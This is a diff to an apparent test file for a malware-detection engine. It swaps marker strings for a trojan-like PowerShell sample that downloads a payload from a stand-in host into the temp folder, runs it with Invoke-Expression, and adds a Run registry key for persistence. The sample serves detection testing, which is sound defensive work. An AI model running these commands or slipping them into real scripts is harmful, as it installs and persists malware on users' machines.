@@ -7,9 +7,9 @@ import { createMalwareEngine } from "../../malware-engine/src/index.js";
 import { createThreatLab } from "../src/index.js";
 
 const TROJAN_LIKE_INERT_TEXT = [
-  "$downloadMarker = 'DownloadString'",
-  "$executionMarker = 'Invoke-Expression'",
-  "$persistenceMarker = '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'"
+  "Invoke-WebRequest -Uri 'https://example.invalid/payload.ps1' -OutFile \"$env:TEMP\\payload.ps1\"",
+  "Invoke-Expression $payload",
+  "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value $payload"
 ].join("\n");
 
 const BENIGN_SINGLE_INDICATOR_TEXT = "$updaterDocumentation = 'DownloadFile'";
